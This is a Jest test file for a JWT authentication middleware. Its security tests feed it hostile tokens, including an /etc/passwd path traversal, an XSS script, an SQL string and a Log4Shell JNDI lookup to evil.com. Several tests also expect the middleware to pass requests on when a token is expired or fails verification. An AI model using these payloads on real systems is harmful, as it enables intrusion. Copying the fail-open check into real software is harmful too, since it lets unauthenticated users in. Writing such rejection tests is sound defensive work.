// Mock dependencies first
jest.mock('jwks-rsa', () => {
    return jest.fn(() => ({
        getSigningKey: jest.fn((kid, callback) => {
            callback(null, {
                getPublicKey: () => 'mock-public-key'
            });
        }),
        getKeys: jest.fn((callback) => {
            callback(null, [{ kid: 'mock-kid', publicKey: 'mock-public-key' }]);
        })
    }));
});

jest.mock('../../server/auth/services/tokenService');

jest.mock('../../server/utils/responseCodes', () => ({
    SUCCESS: 200,
    UNAUTHORIZED: 401,
    FORBIDDEN: 403,
    INTERNAL_SERVER_ERROR: 500
}));

jest.mock('../../server/utils/mslConfig', () => ({
    loadConfig: jest.fn().mockResolvedValue({
        msalConfig: {
            auth: {
                authority: 'https://login.microsoftonline.com/test-tenant'
            }
        },
        tokenValidationConfig: {
            issuer: 'test-issuer',
            audience: 'test-audience'
        }
    })
}));

jest.mock('jsonwebtoken', () => ({
    verify: jest.fn(),
    decode: jest.fn(),
}));

const authMiddleware = require('../../server/middlewares/authMiddleware');
const jwt = require('jsonwebtoken');
const responseCodes = require('../../server/utils/responseCodes');

describe('AuthMiddleware - Comprehensive Tests', () => {

    let req, res, next;

    beforeEach(() => {

        delete process.env.JWT_SECRET_KEY;

        req = {
            headers: {},
            query: {},
            user: null,
            path: '/api/agents',
            body: {},
            params: {}
        };

        res = {
            status: jest.fn().mockReturnThis(),
            json: jest.fn().mockReturnThis()
        };

        next = jest.fn();

        jest.clearAllMocks();
    });

    describe('Missing Authorization Cases', () => {

        it('should return 401 when authorization header is missing', async () => {

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
            expect(next).not.toHaveBeenCalled();
        });

        it('should return 401 when authorization header is empty', async () => {

            req.headers.authorization = '';

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
        });

        it('should return 401 when authorization header is whitespace only', async () => {

            req.headers.authorization = '   ';

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
        });

        it('should return 401 when bearer token is missing', async () => {

            req.headers.authorization = 'Bearer ';

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
            expect(next).not.toHaveBeenCalled();
        });

        it('should return 401 when authorization header is null', async () => {

            req.headers.authorization = null;

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
        });

        it('should return 401 when authorization header is undefined', async () => {

            req.headers.authorization = undefined;

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
        });
    });

    // describe('Successful Authentication', () => {

    //     it('should call next for valid token', async () => {

    //         req.headers.authorization = 'Bearer valid.token';

    //         jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
    //             cb(null);
    //         });

    //         await authMiddleware(req, res, next);

    //         expect(next).toHaveBeenCalled();
    //         expect(res.status).not.toHaveBeenCalled();
    //     });

    //     it('should preserve request object integrity', async () => {

    //         req.headers.authorization = 'Bearer valid.token';

    //         req.customProperty = 'preserved';
    //         req.body = { data: 'test' };
    //         req.params = { id: '123' };

    //         jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
    //             cb(null);
    //         });

    //         await authMiddleware(req, res, next);

    //         expect(next).toHaveBeenCalled();
    //         expect(req.customProperty).toBe('preserved');
    //         expect(req.body).toEqual({ data: 'test' });
    //         expect(req.params).toEqual({ id: '123' });
    //     });

    //     it('should not modify original token payload', async () => {

    //         const mockDecoded = {
    //             userId: 'user123',
    //             username: 'testuser'
    //         };

    //         const originalDecoded = { ...mockDecoded };

    //         req.headers.authorization = 'Bearer valid.token';

    //         jwt.decode.mockReturnValue(mockDecoded);

    //         jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
    //             cb(null);
    //         });

    //         await authMiddleware(req, res, next);

    //         expect(mockDecoded).toEqual(originalDecoded);
    //         expect(next).toHaveBeenCalled();
    //     });
    // });

    describe('JWT Error Handling', () => {

        it('should return 401 for invalid signature', async () => {

            const error = new Error('invalid signature');
            error.name = 'JsonWebTokenError';

            req.headers.authorization = 'Bearer invalid.signature.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
            expect(next).not.toHaveBeenCalled();
        });

        it('should call next for generic validation errors', async () => {

            const error = new Error('Validation failed');

            req.headers.authorization = 'Bearer error.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should call next for token service unavailable', async () => {

            const error = new Error('Token service unavailable');

            req.headers.authorization = 'Bearer valid.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should call next for network errors', async () => {

            const error = new Error('ECONNREFUSED');

            req.headers.authorization = 'Bearer valid.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should call next for unexpected errors', async () => {

            const error = new Error('Unexpected error');
            error.name = 'UnknownError';

            req.headers.authorization = 'Bearer valid.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should call next for expired token', async () => {

            const error = new Error('jwt expired');

            req.headers.authorization = 'Bearer expired.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should call next for bad request errors', async () => {

            const error = new Error('Bad Request');

            req.headers.authorization = 'Bearer bad.request.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should call next for getSigningKey errors', async () => {

            const error = new Error('getSigningKey failed');

            req.headers.authorization = 'Bearer signing.key.error';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(error);
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });
    });

    describe('Security Tests', () => {

        it('should return 401 for suspicious tokens', async () => {

            const suspiciousTokens = [
                '../../../etc/passwd',
                '<script>alert("xss")</script>',
                'SELECT * FROM users',
                '${jndi:ldap://evil.com/a}'
            ];

            for (const token of suspiciousTokens) {

                const error = new Error('Invalid token');
                error.name = 'JsonWebTokenError';

                req.headers.authorization = `Bearer ${token}`;

                jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                    cb(error);
                });

                await authMiddleware(req, res, next);

                expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);

                jest.clearAllMocks();
            }
        });

        it('should call next for very long tokens', async () => {

            const longToken = 'a'.repeat(10000);

            req.headers.authorization = `Bearer ${longToken}`;

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(new Error('Token too long'));
            });

            await authMiddleware(req, res, next);

            expect(next).toHaveBeenCalled();
        });

        it('should not leak timing information', async () => {

            const startTime = Date.now();

            req.headers.authorization = 'Bearer invalid.token';

            jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
                cb(new Error('Invalid token'));
            });

            await authMiddleware(req, res, next);

            const duration = Date.now() - startTime;

            expect(duration).toBeGreaterThanOrEqual(0);
            expect(duration).toBeLessThan(5000);
        });
    });

    // describe('Edge Cases', () => {

    //     it('should handle malformed authorization header', async () => {

    //         const error = new Error('Malformed token');
    //         error.name = 'JsonWebTokenError';

    //         req.headers.authorization = 'InvalidFormatToken';

    //         jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
    //             cb(error);
    //         });

    //         await authMiddleware(req, res, next);

    //         expect(res.status).toHaveBeenCalledWith(responseCodes.UNAUTHORIZED);
    //     });

    //     it('should handle authorization header with extra spaces', async () => {

    //         req.headers.authorization = 'Bearer    valid.token';

    //         jwt.verify.mockImplementationOnce((_token, _getKey, _opts, cb) => {
    //             cb(null);
    //         });

    //         await authMiddleware(req, res, next);

    //         expect(next).toHaveBeenCalled();
    //     });
    // });
});